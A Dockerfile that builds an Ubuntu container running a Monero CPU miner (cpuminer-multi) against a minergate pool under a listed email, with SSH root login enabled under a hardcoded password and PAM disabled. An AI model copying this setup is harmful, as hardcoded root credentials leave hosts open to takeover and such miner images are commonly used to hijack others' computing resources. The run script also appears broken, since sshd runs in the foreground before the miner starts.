FROM ubuntu:16.04
MAINTAINER jaz <jaz@live.in>

# install ubuntu sshd
RUN apt-get update && \
	apt-get clean  && \
	apt-get install -y openssh-server  --no-install-recommends && \
	apt-get clean && \
	rm -rf /var/lib/apt/lists/*
	
RUN mkdir /var/run/sshd && \
	echo 'root:Myhhxx!!' | chpasswd && \
	sed -ri 's/^PermitRootLogin\s+.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \ 
	sed -ri 's/UsePAM yes/#UsePAM yes/g' /etc/ssh/sshd_config

# install python and others
RUN apt-get update && \
	apt-get clean  && \
	apt-get install -y wget screen build-essential libcurl4-openssl-dev git automake libtool libjansson* libncurses5-dev libssl-dev && \
	apt-get clean && \
	rm -rf /var/lib/apt/lists/*
       
       
RUN cd /root && \
  echo "#!/bin/bash" >wa.sh && \
  echo 'apt-get update' >> wa.sh && \
  echo 'git clone --recursive https://github.com/tpruvot/cpuminer-multi.git' >> wa.sh && \
  echo 'cd cpuminer-multi' >> wa.sh && \
  echo 'git checkout linux' >> wa.sh && \
  echo "./autogen.sh" >> wa.sh && \
  echo './configure CFLAGS="-march=native" --with-crypto --with-curl' >> wa.sh && \
  echo "make" >> wa.sh && \
  chmod +x /root/wa.sh


RUN bash /root/wa.sh

ENV address=stratum+tcp://xmr.pool.minergate.com:45560

ENV email=592015984a@gmail.com 

RUN cd /root && \
  echo "#!/bin/bash" > run.sh && \
  #echo '/etc/init.d/ssh start &' >> run.sh && \
  echo "/usr/sbin/sshd -D" >> run.sh && \
  echo "screen -dmS wa /root/cpuminer-multi/cpuminer -a cryptonight -o $address -u $email -p x">> run.sh && \
  #echo '/etc/init.d/ssh stop &' >> run.sh && \
  echo "screen -r wa" >> run.sh && \
  chmod +x run.sh

#screen -dmS wa /root/cpuminer-multi/cpuminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u 592015984a@gmail.com -p x

EXPOSE 22

CMD    ["/root/run.sh"]
